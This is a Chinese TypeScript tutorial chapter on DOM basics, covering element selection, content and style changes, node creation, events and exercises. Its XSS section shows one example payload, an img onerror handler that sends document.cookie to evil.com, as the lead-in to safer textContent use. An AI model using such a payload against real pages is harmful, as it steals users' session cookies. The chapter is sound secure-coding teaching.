[← 返回首页](../readme.md)

# 第 5 章：DOM 操作基础

## 目录约定

```
05_dom_basic/
  README.md
  codes/
    demo/                 ← 演示代码（参考）
      tsconfig.json
      52_dom.html         ← 加载 dist/52_dom.js
      53_dom.html         ← 加载 dist/53_dom.js
      54_dom.html         ← 加载 dist/54_dom.js
      55_dom.html         ← 加载 dist/55_dom.js
      56_dom.html         ← 加载 dist/56_dom.js
      src/
        52_dom.ts         ← 5.2 顶层节点与子节点
        53_dom.ts         ← 5.3 元素选取
        54_dom.ts         ← 5.4 读写内容与样式
        55_dom.ts         ← 5.5 节点的创建与删除
        56_dom.ts         ← 5.6 事件绑定
      dist/               ← tsc 编译后自动生成
    homework/             ← 练习题参考答案
      tsconfig.json
      index.html
      src/
        script.ts
      dist/
  practice/
    demo/                 ← 课堂跟练目录
      tsconfig.json
      52_dom.html
      53_dom.html
      54_dom.html
      55_dom.html
      56_dom.html
      src/
        52_dom.ts         ← 在这里跟随演示编写代码
        53_dom.ts
        54_dom.ts
        55_dom.ts
        56_dom.ts
      dist/
    homework/             ← 课后练习目录
      tsconfig.json
      index.html
      src/
        script.ts         ← 在这里完成六道练习题
      dist/
```

> `dist/` 目录不需要手动创建，`tsc` 编译时会自动生成。

---

## 开发工作流

**这一章的代码运行在浏览器中，不是 Node.js。** 工作流与之前章节不同：

```
TypeScript 源文件 (src/*.ts)
        ↓  tsc 编译
JavaScript 文件 (dist/*.js)
        ↓  HTML 通过 <script src> 加载
     浏览器执行
```

### 课堂跟练（practice/demo/）

```bash
cd practice/demo
tsc --watch
```

打开对应章节的 HTML 文件即可：

| 打开文件 | 对应章节 |
|---|---|
| `52_dom.html` | 5.2 顶层节点与子节点 |
| `53_dom.html` | 5.3 元素选取 |
| `54_dom.html` | 5.4 读写内容与样式 |
| `55_dom.html` | 5.5 节点的创建与删除 |
| `56_dom.html` | 5.6 事件绑定 |

每个 HTML 已通过 `<script src="./dist/5x_dom.js">` 绑定编译产物，`tsc` 编译后刷新浏览器即可看到效果。用 F12 打开 Console 面板查看 `console.log` 输出。

### 课后练习（practice/homework/）

```bash
cd practice/homework
tsc --watch
```

编译后打开 `index.html`，在 `src/script.ts` 中完成练习题。参考答案见 `codes/homework/src/script.ts`。

---

## 5.1 什么是 DOM？

**DOM（Document Object Model，文档对象模型）** 是浏览器将 HTML 解析后构建的一棵**对象树**，JavaScript（或 TypeScript）可以通过这棵树读取和修改页面上的任何内容。

```
document
└── <html>
    ├── <head>
    │   └── <title>
    └── <body>
        ├── <div id="banner">
        │   └── <h1>
        ├── <p class="p1">
        └── <ul>
            ├── <li>
            └── <li>
```

DOM 中的一切都是**节点（Node）**，节点有不同类型：

| 类型 | 示例 |
|---|---|
| Element 节点 | `<div>`、`<p>`、`<input>` |
| Text 节点 | 标签之间的文本（包括换行/空白） |
| Comment 节点 | `<!-- 注释 -->` |
| Document 节点 | 整个 `document` 对象 |

---

## 5.2 顶层节点与子节点

```typescript
// DOM 树的三个顶层入口
const ht = document.documentElement as HTMLHtmlElement; // <html>
const hd = document.head as HTMLHeadElement;            // <head>
const bd = document.body as HTMLBodyElement;            // <body>

// children：只包含子元素节点（<div>、<p> 等标签）
const bdChildren = bd.children as HTMLCollectionOf<Element>;

// childNodes：包含所有子节点，包括文本节点（换行/空格）、注释节点
const bdChildNodes = bd.childNodes as NodeListOf<Node>;
```

> 日常开发中几乎不会直接用 `children` / `childNodes` 遍历，了解它们有助于理解 DOM 的节点结构。

---

## 5.3 元素选取

获取页面元素有三种方法：

```typescript
// getElementById - 按 id 获取单个元素
const banner = document.getElementById("banner") as HTMLDivElement;

// querySelector - 按 CSS 选择器获取第一个匹配元素
const p1 = document.querySelector(".p1") as HTMLParagraphElement;   // class
const box = document.querySelector("#content") as HTMLDivElement;   // id
const span = document.querySelector("p > span") as HTMLSpanElement; // 嵌套

// querySelectorAll - 获取所有匹配元素，返回 NodeList
const allLi = document.querySelectorAll("li") as NodeListOf<HTMLLIElement>;
```

**NodeList 与 Array 的区别：**

`querySelectorAll` 返回的是 `NodeList`，它类似数组但不是真正的数组——只有 `forEach`，没有 `map`、`filter`、`every` 等方法。需要这些方法时先转换：

```typescript
// NodeList → Array
const liArray = Array.from(allLi);
liArray.filter(li => li.classList.contains("active"));
```

---

## 5.4 读写元素内容与样式

### innerHTML / innerText / textContent

```typescript
const p2 = document.querySelector(".p2") as HTMLParagraphElement;
// 假设 p2 的 HTML 是：<p class="p2">段落，<span>特殊文字</span></p>

p2.innerHTML;   // "段落，<span>特殊文字</span>"  ← 含子标签
p2.innerText;   // "段落，特殊文字"               ← 纯文本，受 CSS 影响（display:none 的内容不含）
p2.textContent; // "段落，特殊文字"               ← 纯文本，不受 CSS 影响，性能更好

// 写入
p2.innerHTML = "Hello, <br>World!"; // 解析 HTML
p2.innerText = "Hello, <br>World!"; // <br> 会被原样显示为文本
```

### classList 操作样式

```typescript
const li = document.querySelector("li") as HTMLLIElement;

li.classList.add("active");     // 添加 class
li.classList.remove("active");  // 移除 class
li.classList.toggle("active");  // 有则移除，无则添加
li.classList.contains("active") // 检查是否有该 class → true/false
```

### style 内联样式

```typescript
li.style.color = "red";
li.style.backgroundColor = "yellow"; // CSS 属性名转驼峰命名
li.style.fontSize = "16px";
```

### 元素属性

```typescript
const input = document.querySelector("#input1") as HTMLInputElement;

input.type;         // 读取 type 属性
input.type = "password"; // 修改 type 属性
input.value;        // 读取输入框当前值
input.checked;      // checkbox 是否选中（boolean）
```

---

## 5.5 节点的创建、插入与删除

```typescript
const ul = document.querySelector("ul") as HTMLUListElement;

// 创建新节点
const newLi = document.createElement("li");
newLi.innerHTML = "<a href='#'>新项目</a>";
newLi.classList.add("item");

// 插入节点
ul.appendChild(newLi);               // 追加到末尾
ul.insertBefore(newLi, ul.firstChild); // 插入到开头

// append 可以同时插入多个节点或文本
const text = document.createTextNode("纯文本");
const btn = document.createElement("button");
li.append(text, btn);

// 删除节点
ul.removeChild(newLi); // 父节点删除指定子节点
newLi.remove();        // 节点自删（更简洁）
```

---

## 5.6 事件绑定

### 三种绑定方式

```typescript
// 方式一：addEventListener（推荐）
// 同一事件类型可绑定多个处理函数，互不覆盖
btn.addEventListener('click', () => {
    console.log('点击了');
});

// 具名函数，方便后续移除
function handleClick() { console.log('点击了'); }
btn.addEventListener('click', handleClick);
btn.removeEventListener('click', handleClick); // 移除监听器

// 方式二：onXXX 属性（只能绑定一个，新赋值会覆盖旧的）
btn.onclick = () => { console.log('点击了'); };

// 方式三：HTML 内联（不推荐，逻辑与结构混合）
// <button onclick="handleClick()">按钮</button>
```

### 常用事件类型

```typescript
// 鼠标事件
element.addEventListener('click', handler);       // 点击
element.addEventListener('mouseover', handler);   // 鼠标悬入
element.addEventListener('mouseout', handler);    // 鼠标离开

// 键盘事件
input.addEventListener('keydown', (event) => {
    console.log(event.key);   // 按键名称，如 "Enter"、"a"
    console.log(event.code);  // 按键编码，如 "KeyA"
});

// 输入框事件
input.addEventListener('input', () => {
    console.log(input.value); // 每次输入内容变化时触发（实时）
});
input.addEventListener('change', () => {
    console.log(input.value); // 失去焦点且内容有变化时触发
});
```

### dataset 自定义数据属性

HTML 中可以用 `data-*` 属性附加任意数据，在 JS 中通过 `dataset` 读取：

```html
<button class="delete-btn" data-user-id="42">删除</button>
```

```typescript
const btn = document.querySelector(".delete-btn") as HTMLButtonElement;
console.log(btn.dataset.userId); // "42"（注意是字符串，需要 Number() 转换）
```

---

## 5.7 innerHTML 与 XSS 安全风险

使用 `innerHTML` 拼接来自用户输入的内容时存在 **XSS（跨站脚本攻击）** 风险。

**危险示例：**

```typescript
// 假设 name 来自用户输入
const name = `李四<img src="x" onerror="fetch('https://evil.com?c='+document.cookie)">`;
result.innerHTML = `<li>${name}</li>`; // 恶意脚本会在页面加载时执行
```

**安全做法：使用 `createElement` + `textContent`**

```typescript
const li = document.createElement("li");
li.textContent = name; // textContent 不解析 HTML，完全安全
result.appendChild(li);
```

> **规则：** 当数据来源可信（自己写的常量、服务端已转义的数据）时使用 `innerHTML` 可以接受；当数据来自用户输入时，必须用 `textContent` 或 `createElement`。

---

## 练习题

对应 `practice/index.html`，在 `practice/src/script.ts` 中完成以下六道题：

**第一题：显示和隐藏密码**
点击按钮，切换密码输入框的 `type` 在 `"text"` 和 `"password"` 之间。

**第二题：获取输入框的值**
点击按钮，将输入框的内容显示在 `#result` 区域。

**第三题：Tab 切换**
点击列表中的任意一项，该项添加 `active` 样式，其他项移除。

**第四题：渲染电影列表**
定义一个 `Film` interface，创建包含 3 部电影的数组（url、title、grade），点击按钮后用 `map` + `innerHTML` 渲染到 `#result`。

**第五题：购物清单**
- 点击"全选"，所有子复选框跟随选中/取消
- 任意子复选框变化时，检查是否全选，同步"全选"按钮状态
- 点击"提交"，收集所有选中项并用 `alert` 显示

**第六题：学生列表**
定义 `Student` interface，创建包含 6 名学生的数组，实现以下功能：
- `btn6`：用 `innerHTML` 拼接渲染学生列表，每项有"删除"按钮（渲染后重新绑定事件）
- `btn7`：用 `createElement` 渲染，在创建按钮时直接绑定删除事件

参考答案见 `codes/homework/src/script.ts`。
